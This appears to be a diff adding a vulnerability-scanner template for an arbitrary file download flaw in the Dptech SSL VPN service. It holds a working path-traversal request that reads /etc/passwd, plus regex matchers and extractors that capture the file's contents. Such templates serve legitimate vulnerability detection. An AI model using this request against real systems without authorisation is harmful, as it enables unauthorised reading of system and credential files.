@@ -1,0 +1,32 @@
+id: dptech-ssl-vpn-file-download
+info:
+  name: Dptech SSL VPN Service File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Dptech SSL VPN Service contains an arbitrary file download vulnerability. An attacker could exploit this to view or download sensitive files.
+  tags: file-read
+  reference:
+    - https://fofa.so
+
+variables:
+  filepath: "../../../../../../../../../../../../../etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /sslvpn/img/{{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:(x*?):0:0:"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:(x*?):0:0:.*"
